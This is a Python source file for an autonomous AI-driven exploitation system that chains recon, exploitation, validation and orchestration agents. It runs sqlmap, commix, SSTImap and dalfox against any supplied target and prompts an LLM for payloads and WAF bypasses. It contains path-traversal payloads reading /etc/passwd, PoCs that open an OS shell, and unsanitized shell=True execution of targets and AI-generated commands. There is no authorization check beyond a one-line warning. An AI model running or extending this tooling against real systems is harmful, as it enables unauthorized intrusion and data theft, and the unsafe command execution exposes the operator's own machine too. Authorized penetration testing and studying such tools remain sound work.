"""
PSAVVY AI - Autonomous Exploitation Agent System
Implements XBOW-like autonomous security testing with AI agents

WARNING: For authorized security testing only.
"""

import subprocess
import os
import json
import time
import re
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from abc import ABC, abstractmethod

# Import AI providers
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from ai_engine import AIProviderManager
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False


class AgentStatus(Enum):
    IDLE = "idle"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    BLOCKED = "blocked"


class VulnSeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class Finding:
    """Represents a discovered vulnerability"""
    vuln_type: str
    target: str
    severity: VulnSeverity
    evidence: str
    poc: str = ""
    validated: bool = False
    exploitable: bool = False
    impact: str = ""


@dataclass
class AgentTask:
    """Task for an agent to execute"""
    task_id: str
    task_type: str
    target: str
    parameters: Dict[str, Any] = field(default_factory=dict)
    priority: int = 5
    depends_on: List[str] = field(default_factory=list)
    status: AgentStatus = AgentStatus.IDLE
    result: Any = None


class BaseAgent(ABC):
    """Base class for all autonomous agents"""

    def __init__(self, ai_manager: AIProviderManager, name: str):
        self.ai_manager = ai_manager
        self.name = name
        self.status = AgentStatus.IDLE
        self.findings: List[Finding] = []
        self.logs: List[str] = []

    def log(self, message: str):
        timestamp = time.strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [{self.name}] {message}"
        self.logs.append(log_entry)
        print(log_entry)

    def execute_tool(self, command: str, timeout: int = 300) -> Tuple[str, int]:
        """Execute a security tool and return output"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return result.stdout + result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "Command timed out", -1
        except Exception as e:
            return f"Error: {str(e)}", -1

    @abstractmethod
    def run(self, task: AgentTask) -> Any:
        pass


class ReconAgent(BaseAgent):
    """
    Autonomous reconnaissance agent
    Discovers attack surface, endpoints, parameters
    """

    def __init__(self, ai_manager: AIProviderManager):
        super().__init__(ai_manager, "ReconAgent")

    def run(self, task: AgentTask) -> Dict[str, Any]:
        self.status = AgentStatus.RUNNING
        self.log(f"Starting reconnaissance on {task.target}")

        results = {
            "subdomains": [],
            "urls": [],
            "parameters": [],
            "technologies": [],
            "potential_vulns": []
        }

        # Phase 1: Subdomain enumeration
        self.log("Phase 1: Subdomain enumeration")
        subdomains = self._enumerate_subdomains(task.target)
        results["subdomains"] = subdomains

        # Phase 2: URL discovery
        self.log("Phase 2: URL and endpoint discovery")
        urls = self._discover_urls(subdomains)
        results["urls"] = urls

        # Phase 3: Parameter discovery
        self.log("Phase 3: Parameter discovery")
        params = self._discover_parameters(urls)
        results["parameters"] = params

        # Phase 4: Technology fingerprinting
        self.log("Phase 4: Technology fingerprinting")
        tech = self._fingerprint_technologies(task.target)
        results["technologies"] = tech

        # Phase 5: AI analysis for potential vulnerabilities
        self.log("Phase 5: AI analysis for attack vectors")
        potential = self._ai_identify_attack_vectors(results)
        results["potential_vulns"] = potential

        self.status = AgentStatus.SUCCESS
        self.log(f"Recon complete: {len(subdomains)} subdomains, {len(urls)} URLs, {len(params)} parameters")
        return results

    def _enumerate_subdomains(self, domain: str) -> List[str]:
        """Enumerate subdomains using multiple tools"""
        subdomains = set()

        # Using subfinder (if available)
        output, _ = self.execute_tool(f"subfinder -d {domain} -silent 2>/dev/null")
        subdomains.update(output.strip().split('\n'))

        # Using amass (if available)
        output, _ = self.execute_tool(f"amass enum -passive -d {domain} 2>/dev/null")
        subdomains.update(output.strip().split('\n'))

        # Filter empty entries
        return [s for s in subdomains if s and '.' in s]

    def _discover_urls(self, subdomains: List[str]) -> List[str]:
        """Discover URLs from subdomains"""
        urls = set()

        for subdomain in subdomains[:50]:  # Limit for speed
            # Using gau
            output, _ = self.execute_tool(f"echo {subdomain} | gau --subs 2>/dev/null | head -100")
            urls.update(output.strip().split('\n'))

        return [u for u in urls if u.startswith('http')]

    def _discover_parameters(self, urls: List[str]) -> List[Dict[str, str]]:
        """Extract parameters from URLs"""
        params = []
        param_pattern = re.compile(r'[?&]([^=]+)=([^&]*)')

        for url in urls:
            matches = param_pattern.findall(url)
            for name, value in matches:
                params.append({
                    "url": url,
                    "name": name,
                    "value": value
                })

        return params

    def _fingerprint_technologies(self, domain: str) -> List[str]:
        """Identify technologies using various methods"""
        technologies = []

        # Using httpx
        output, _ = self.execute_tool(f"echo {domain} | httpx -tech-detect -silent 2>/dev/null")
        if output:
            technologies.extend(output.strip().split('\n'))

        return technologies

    def _ai_identify_attack_vectors(self, recon_data: Dict) -> List[Dict[str, Any]]:
        """Use AI to identify potential attack vectors from recon data"""
        prompt = f"""Analyze this reconnaissance data and identify potential attack vectors:

Subdomains: {len(recon_data['subdomains'])} found
Sample URLs: {recon_data['urls'][:10]}
Parameters found: {recon_data['parameters'][:20]}
Technologies: {recon_data['technologies']}

For each potential vulnerability:
1. Vulnerability type (XSS, SQLi, SSRF, etc.)
2. Target URL/parameter
3. Why it's likely vulnerable
4. Suggested test payload
5. Priority (1-10)

Return as JSON array."""

        response = self.ai_manager.query_for_analysis(prompt)

        # Parse AI response
        try:
            # Try to extract JSON from response
            json_match = re.search(r'\[.*\]', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
        except:
            pass

        return []


class ExploitAgent(BaseAgent):
    """
    Autonomous exploitation agent
    Attempts to exploit identified vulnerabilities
    """

    def __init__(self, ai_manager: AIProviderManager):
        super().__init__(ai_manager, "ExploitAgent")
        self.max_attempts = 5

    def run(self, task: AgentTask) -> List[Finding]:
        self.status = AgentStatus.RUNNING
        target = task.parameters.get("target_url", task.target)
        vuln_type = task.parameters.get("vuln_type", "unknown")

        self.log(f"Attempting to exploit {vuln_type} on {target}")

        findings = []

        # Get AI-generated exploitation strategy
        strategy = self._get_exploitation_strategy(vuln_type, target, task.parameters)

        # Execute exploitation attempts
        for attempt_num, attempt in enumerate(strategy.get("attempts", []), 1):
            self.log(f"Attempt {attempt_num}/{len(strategy.get('attempts', []))}: {attempt.get('technique', 'unknown')}")

            result = self._execute_exploit_attempt(
                target=target,
                vuln_type=vuln_type,
                payload=attempt.get("payload", ""),
                technique=attempt.get("technique", ""),
                parameters=task.parameters
            )

            if result["success"]:
                finding = Finding(
                    vuln_type=vuln_type,
                    target=target,
                    severity=self._determine_severity(vuln_type, result),
                    evidence=result["evidence"],
                    poc=result["poc"],
                    validated=False,
                    exploitable=True,
                    impact=result.get("impact", "")
                )
                findings.append(finding)
                self.findings.append(finding)
                self.log(f"SUCCESS: {vuln_type} exploited!")
                break
            else:
                self.log(f"Attempt failed: {result.get('reason', 'unknown')}")

                # AI adapts strategy based on failure
                if attempt_num < self.max_attempts:
                    strategy = self._adapt_strategy(strategy, result, attempt_num)

        self.status = AgentStatus.SUCCESS if findings else AgentStatus.FAILED
        return findings

    def _get_exploitation_strategy(self, vuln_type: str, target: str, context: Dict) -> Dict:
        """Get AI-generated exploitation strategy"""
        prompt = f"""Create an exploitation strategy for:

Vulnerability: {vuln_type}
Target: {target}
Context: {json.dumps(context)}

Provide 5 exploitation attempts in order of likelihood to succeed.
For each attempt include:
- technique: Name of technique
- payload: Exact payload to use
- injection_point: Where to inject
- success_indicator: How to detect success
- risk_level: low/medium/high

Return as JSON with "attempts" array."""

        response = self.ai_manager.query_for_analysis(prompt)

        try:
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
        except:
            pass

        # Default strategy
        return {"attempts": [{"technique": "default", "payload": "", "success_indicator": ""}]}

    def _execute_exploit_attempt(self, target: str, vuln_type: str, payload: str,
                                  technique: str, parameters: Dict) -> Dict:
        """Execute a single exploitation attempt"""
        result = {
            "success": False,
            "evidence": "",
            "poc": "",
            "reason": ""
        }

        # Route to appropriate exploitation method
        if vuln_type.lower() in ["xss", "cross-site scripting"]:
            result = self._exploit_xss(target, payload, parameters)
        elif vuln_type.lower() in ["sqli", "sql injection"]:
            result = self._exploit_sqli(target, payload, parameters)
        elif vuln_type.lower() in ["ssrf", "server-side request forgery"]:
            result = self._exploit_ssrf(target, payload, parameters)
        elif vuln_type.lower() in ["ssti", "template injection"]:
            result = self._exploit_ssti(target, payload, parameters)
        elif vuln_type.lower() in ["cmdi", "command injection"]:
            result = self._exploit_cmdi(target, payload, parameters)
        elif vuln_type.lower() in ["lfi", "path traversal"]:
            result = self._exploit_lfi(target, payload, parameters)
        else:
            result = self._exploit_generic(target, vuln_type, payload, parameters)

        return result

    def _exploit_xss(self, target: str, payload: str, params: Dict) -> Dict:
        """Attempt XSS exploitation"""
        result = {"success": False, "evidence": "", "poc": "", "reason": ""}

        # Use dalfox for XSS testing
        cmd = f"echo '{target}' | dalfox pipe --silence --only-poc 2>/dev/null"
        output, code = self.execute_tool(cmd, timeout=60)

        if "POC" in output or "Vulnerable" in output.lower():
            result["success"] = True
            result["evidence"] = output
            result["poc"] = f"curl '{target}' --data '{payload}'"
            result["impact"] = "Cross-Site Scripting allows session hijacking, defacement, malware distribution"

        return result

    def _exploit_sqli(self, target: str, payload: str, params: Dict) -> Dict:
        """Attempt SQL injection exploitation"""
        result = {"success": False, "evidence": "", "poc": "", "reason": ""}

        # Use sqlmap for SQLi testing
        cmd = f"python3 Tools/sqlmap/sqlmap.py -u '{target}' --batch --level=2 --risk=2 --threads=5 2>/dev/null | head -100"
        output, code = self.execute_tool(cmd, timeout=120)

        if "is vulnerable" in output.lower() or "injectable" in output.lower():
            result["success"] = True
            result["evidence"] = output
            result["poc"] = f"sqlmap -u '{target}' --batch --dbs"
            result["impact"] = "SQL Injection allows database access, data theft, authentication bypass"

        return result

    def _exploit_ssrf(self, target: str, payload: str, params: Dict) -> Dict:
        """Attempt SSRF exploitation"""
        result = {"success": False, "evidence": "", "poc": "", "reason": ""}

        # Test with callback
        callback = params.get("callback_url", "http://127.0.0.1")
        test_url = target.replace("FUZZ", callback) if "FUZZ" in target else f"{target}?url={callback}"

        output, code = self.execute_tool(f"curl -s -o /dev/null -w '%{{http_code}}' '{test_url}'", timeout=30)

        if output.strip() in ["200", "301", "302"]:
            # Further validation needed
            result["evidence"] = f"Potential SSRF - Response code: {output}"
            result["poc"] = f"curl '{test_url}'"

        return result

    def _exploit_ssti(self, target: str, payload: str, params: Dict) -> Dict:
        """Attempt SSTI exploitation"""
        result = {"success": False, "evidence": "", "poc": "", "reason": ""}

        # Use SSTImap
        cmd = f"python3 Tools/SSTImap/sstimap.py -u '{target}' --level 2 2>/dev/null | head -50"
        output, code = self.execute_tool(cmd, timeout=90)

        if "Confirmed" in output or "Injectable" in output:
            result["success"] = True
            result["evidence"] = output
            result["poc"] = f"python3 Tools/SSTImap/sstimap.py -u '{target}' --os-shell"
            result["impact"] = "Template Injection leads to Remote Code Execution"

        return result

    def _exploit_cmdi(self, target: str, payload: str, params: Dict) -> Dict:
        """Attempt command injection exploitation"""
        result = {"success": False, "evidence": "", "poc": "", "reason": ""}

        # Use commix
        cmd = f"python3 Tools/commix/commix.py -u '{target}' --batch --level=2 2>/dev/null | head -50"
        output, code = self.execute_tool(cmd, timeout=90)

        if "is vulnerable" in output.lower():
            result["success"] = True
            result["evidence"] = output
            result["poc"] = f"python3 Tools/commix/commix.py -u '{target}' --os-shell"
            result["impact"] = "Command Injection allows full system compromise"

        return result

    def _exploit_lfi(self, target: str, payload: str, params: Dict) -> Dict:
        """Attempt LFI exploitation"""
        result = {"success": False, "evidence": "", "poc": "", "reason": ""}

        # Test common LFI payloads
        lfi_payloads = [
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "/etc/passwd%00",
            "....//....//....//windows/win.ini"
        ]

        for lfi_payload in lfi_payloads:
            test_url = target.replace("FUZZ", lfi_payload) if "FUZZ" in target else f"{target}{lfi_payload}"
            output, code = self.execute_tool(f"curl -s '{test_url}'", timeout=30)

            if "root:" in output or "[extensions]" in output:
                result["success"] = True
                result["evidence"] = output[:500]
                result["poc"] = f"curl '{test_url}'"
                result["impact"] = "Local File Inclusion allows reading sensitive files, potential RCE via log poisoning"
                break

        return result

    def _exploit_generic(self, target: str, vuln_type: str, payload: str, params: Dict) -> Dict:
        """Generic exploitation attempt using AI guidance"""
        result = {"success": False, "evidence": "", "poc": "", "reason": "Not implemented"}
        return result

    def _adapt_strategy(self, current_strategy: Dict, failed_result: Dict, attempt_num: int) -> Dict:
        """Use AI to adapt strategy after failure"""
        prompt = f"""Previous exploitation attempt failed:
Reason: {failed_result.get('reason', 'unknown')}

Current strategy: {json.dumps(current_strategy)}
Attempt number: {attempt_num}

Suggest modified payloads that might bypass the protection.
Consider:
- Encoding variations
- WAF bypass techniques
- Alternative syntax

Return updated strategy as JSON."""

        response = self.ai_manager.query_for_analysis(prompt)

        try:
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
        except:
            pass

        return current_strategy

    def _determine_severity(self, vuln_type: str, result: Dict) -> VulnSeverity:
        """Determine vulnerability severity"""
        critical_vulns = ["rce", "command injection", "sql injection", "ssti"]
        high_vulns = ["xss", "ssrf", "lfi", "authentication bypass"]
        medium_vulns = ["csrf", "idor", "open redirect"]

        vuln_lower = vuln_type.lower()

        if any(v in vuln_lower for v in critical_vulns):
            return VulnSeverity.CRITICAL
        elif any(v in vuln_lower for v in high_vulns):
            return VulnSeverity.HIGH
        elif any(v in vuln_lower for v in medium_vulns):
            return VulnSeverity.MEDIUM
        else:
            return VulnSeverity.LOW


class ValidationAgent(BaseAgent):
    """
    Autonomous validation agent
    Confirms exploitability and generates PoC
    """

    def __init__(self, ai_manager: AIProviderManager):
        super().__init__(ai_manager, "ValidationAgent")

    def run(self, task: AgentTask) -> Finding:
        self.status = AgentStatus.RUNNING
        finding: Finding = task.parameters.get("finding")

        if not finding:
            self.status = AgentStatus.FAILED
            return None

        self.log(f"Validating {finding.vuln_type} on {finding.target}")

        # Step 1: Reproduce the vulnerability
        reproduced = self._reproduce_vulnerability(finding)

        if not reproduced:
            self.log("Could not reproduce vulnerability")
            finding.validated = False
            self.status = AgentStatus.FAILED
            return finding

        # Step 2: Generate working PoC
        poc = self._generate_poc(finding)
        finding.poc = poc

        # Step 3: Assess real impact
        impact = self._assess_impact(finding)
        finding.impact = impact

        # Step 4: Mark as validated
        finding.validated = True
        self.log(f"Validation complete: {finding.vuln_type} confirmed!")

        self.status = AgentStatus.SUCCESS
        return finding

    def _reproduce_vulnerability(self, finding: Finding) -> bool:
        """Attempt to reproduce the vulnerability"""
        # Re-run the PoC
        if finding.poc:
            output, code = self.execute_tool(finding.poc, timeout=60)
            # Check for success indicators
            if code == 0 and len(output) > 0:
                return True
        return False

    def _generate_poc(self, finding: Finding) -> str:
        """Generate a clean, working PoC"""
        prompt = f"""Generate a clean, working proof-of-concept for:

Vulnerability: {finding.vuln_type}
Target: {finding.target}
Evidence: {finding.evidence[:1000]}

Provide:
1. One-liner curl/wget command
2. Python script (standalone)
3. Steps to reproduce manually

The PoC should:
- Be safe (use harmless payloads like alert(1), id, etc.)
- Be reliable and reproducible
- Include clear success indicators"""

        return self.ai_manager.query_for_generation(prompt)

    def _assess_impact(self, finding: Finding) -> str:
        """Assess the real-world impact of the vulnerability"""
        prompt = f"""Assess the business impact of this vulnerability:

Type: {finding.vuln_type}
Target: {finding.target}
Severity: {finding.severity.value}
Evidence: {finding.evidence[:500]}

Provide:
1. What data/systems are at risk
2. Potential attack scenarios
3. Compliance implications (PCI-DSS, HIPAA, GDPR)
4. Estimated CVSS score
5. Urgency of remediation"""

        return self.ai_manager.query_for_analysis(prompt)


class OrchestratorAgent:
    """
    Master orchestrator that coordinates all agents
    Similar to XBOW's AI coordinator
    """

    def __init__(self, ai_manager: AIProviderManager):
        self.ai_manager = ai_manager
        self.recon_agent = ReconAgent(ai_manager)
        self.exploit_agent = ExploitAgent(ai_manager)
        self.validation_agent = ValidationAgent(ai_manager)
        self.task_queue: List[AgentTask] = []
        self.findings: List[Finding] = []
        self.logs: List[str] = []

    def log(self, message: str):
        timestamp = time.strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [Orchestrator] {message}"
        self.logs.append(log_entry)
        print(log_entry)

    def run_autonomous_test(self, target: str, config: Dict = None) -> Dict[str, Any]:
        """
        Run fully autonomous security test on target
        This is the main entry point - similar to XBOW
        """
        config = config or {}
        start_time = time.time()

        self.log(f"Starting autonomous security test on {target}")
        self.log("=" * 60)

        results = {
            "target": target,
            "start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "findings": [],
            "summary": {},
            "logs": []
        }

        try:
            # Phase 1: Reconnaissance
            self.log("PHASE 1: RECONNAISSANCE")
            recon_task = AgentTask(
                task_id="recon_1",
                task_type="reconnaissance",
                target=target
            )
            recon_results = self.recon_agent.run(recon_task)

            # Phase 2: Plan exploitation based on recon
            self.log("PHASE 2: ATTACK PLANNING")
            attack_plan = self._create_attack_plan(recon_results, config)

            # Phase 3: Execute exploitation
            self.log("PHASE 3: EXPLOITATION")
            for i, attack in enumerate(attack_plan, 1):
                self.log(f"Attack {i}/{len(attack_plan)}: {attack['vuln_type']} on {attack['target']}")

                exploit_task = AgentTask(
                    task_id=f"exploit_{i}",
                    task_type="exploitation",
                    target=target,
                    parameters=attack
                )

                findings = self.exploit_agent.run(exploit_task)

                # Phase 4: Validate successful exploits
                for finding in findings:
                    self.log("PHASE 4: VALIDATION")
                    validate_task = AgentTask(
                        task_id=f"validate_{i}",
                        task_type="validation",
                        target=target,
                        parameters={"finding": finding}
                    )

                    validated_finding = self.validation_agent.run(validate_task)
                    if validated_finding and validated_finding.validated:
                        self.findings.append(validated_finding)

            # Generate summary
            results["findings"] = [self._finding_to_dict(f) for f in self.findings]
            results["summary"] = self._generate_summary()
            results["logs"] = self.logs
            results["duration"] = time.time() - start_time

            self.log("=" * 60)
            self.log(f"Test complete: {len(self.findings)} validated vulnerabilities found")
            self.log(f"Duration: {results['duration']:.2f} seconds")

        except Exception as e:
            self.log(f"ERROR: {str(e)}")
            results["error"] = str(e)

        return results

    def _create_attack_plan(self, recon_results: Dict, config: Dict) -> List[Dict]:
        """Use AI to create prioritized attack plan"""
        prompt = f"""Based on reconnaissance results, create a prioritized attack plan:

Recon Data:
- Subdomains: {len(recon_results.get('subdomains', []))}
- URLs: {len(recon_results.get('urls', []))}
- Parameters: {recon_results.get('parameters', [])[:20]}
- Technologies: {recon_results.get('technologies', [])}
- Potential vulns identified: {recon_results.get('potential_vulns', [])}

Create attack plan with:
1. Highest probability of success first
2. Maximum 20 attacks
3. Mix of vulnerability types
4. Include specific URLs and parameters

Return as JSON array with objects containing:
- vuln_type: Type of vulnerability
- target_url: Specific URL to test
- parameter: Parameter to inject
- priority: 1-10
- technique: Exploitation technique"""

        response = self.ai_manager.query_for_analysis(prompt)

        try:
            json_match = re.search(r'\[.*\]', response, re.DOTALL)
            if json_match:
                plan = json.loads(json_match.group())
                # Sort by priority
                return sorted(plan, key=lambda x: x.get('priority', 5), reverse=True)[:20]
        except:
            pass

        # Fallback: test each potential vuln from recon
        return recon_results.get('potential_vulns', [])[:10]

    def _generate_summary(self) -> Dict[str, Any]:
        """Generate test summary"""
        summary = {
            "total_findings": len(self.findings),
            "critical": len([f for f in self.findings if f.severity == VulnSeverity.CRITICAL]),
            "high": len([f for f in self.findings if f.severity == VulnSeverity.HIGH]),
            "medium": len([f for f in self.findings if f.severity == VulnSeverity.MEDIUM]),
            "low": len([f for f in self.findings if f.severity == VulnSeverity.LOW]),
            "validated": len([f for f in self.findings if f.validated]),
            "vuln_types": list(set(f.vuln_type for f in self.findings))
        }
        return summary

    def _finding_to_dict(self, finding: Finding) -> Dict:
        """Convert Finding to dictionary"""
        return {
            "vuln_type": finding.vuln_type,
            "target": finding.target,
            "severity": finding.severity.value,
            "evidence": finding.evidence,
            "poc": finding.poc,
            "validated": finding.validated,
            "exploitable": finding.exploitable,
            "impact": finding.impact
        }


def run_autonomous_scan(target: str, config_path: str = "config.yaml"):
    """
    Main function to run autonomous security scan

    Usage:
        python3 autonomous_agents.py target.com
    """
    # Load config
    config = {}
    if os.path.exists(config_path):
        import yaml
        with open(config_path) as f:
            config = yaml.safe_load(f) or {}

    # Initialize AI
    ai_manager = AIProviderManager(config)

    if not ai_manager.available_providers():
        print("ERROR: No AI providers configured. Add API keys to config.yaml")
        return

    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║     PSAVVY AI - AUTONOMOUS EXPLOITATION SYSTEM            ║
    ║     AI-Powered Security Testing                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    # Create orchestrator and run
    orchestrator = OrchestratorAgent(ai_manager)
    results = orchestrator.run_autonomous_test(target, config)

    # Save results
    output_path = f"output/autonomous_scan_{target.replace('.', '_')}.json"
    os.makedirs("output", exist_ok=True)
    with open(output_path, 'w') as f:
        json.dump(results, f, indent=2, default=str)

    print(f"\nResults saved to: {output_path}")

    # Print summary
    summary = results.get("summary", {})
    print(f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║                    SCAN SUMMARY                           ║
    ╠═══════════════════════════════════════════════════════════╣
    ║  Total Findings:    {summary.get('total_findings', 0):3d}                                 ║
    ║  Critical:          {summary.get('critical', 0):3d}                                 ║
    ║  High:              {summary.get('high', 0):3d}                                 ║
    ║  Medium:            {summary.get('medium', 0):3d}                                 ║
    ║  Low:               {summary.get('low', 0):3d}                                 ║
    ║  Validated:         {summary.get('validated', 0):3d}                                 ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 autonomous_agents.py <target>")
        print("Example: python3 autonomous_agents.py example.com")
        sys.exit(1)

    target = sys.argv[1]
    config_path = sys.argv[2] if len(sys.argv) > 2 else "config.yaml"

    run_autonomous_scan(target, config_path)
